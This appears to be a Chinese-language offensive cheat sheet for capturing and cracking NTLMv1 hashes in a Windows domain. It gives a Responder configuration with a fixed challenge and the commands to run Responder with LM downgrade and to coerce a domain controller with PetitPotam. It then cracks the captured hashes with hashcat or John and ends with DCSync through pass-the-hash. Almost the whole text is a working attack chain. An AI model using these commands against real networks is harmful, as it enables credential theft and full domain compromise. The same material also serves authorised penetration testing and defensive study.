	Net-NTLM (NTLMv1) 散列用于网络身份验证（它们源自质询/响应算法并基于用户的 NT 散列。
	要求：
	LmCompatibilityLevel = 0x1：发送 LM & NTLM ( reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel)
	使用 Responder 捕获：编辑/etc/responder/Responder.conf文件
```bash
	HTTPS = On
	DNS = On
	LDAP = On
	...
	; Custom challenge.
	; Use "Random" for generating a random challenge for each requests (Default)
	Challenge = 1122334455667788
```
	Fire Responder: responder -I eth0 --lm，如果--disable-ess设置，扩展会话安全将被禁用 NTLMv1 身份验证
	>PetitPotam.exe Responder-IP DC-IP #2021 年 8 月左右修补
	>PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP #未为经过身份验证的用户打补丁
	如果获取到些NTLMv1 hashes
	去这里https://crack.sh/
	或者用 Hashcat / John The Ripper 破解
	>john --format=netntlm hash.txt
	>hashcat -m 5500 -a 3 hash.txt
	现在可以通过 DC 机器帐户使用 Pass-The-Hash 进行 DCSync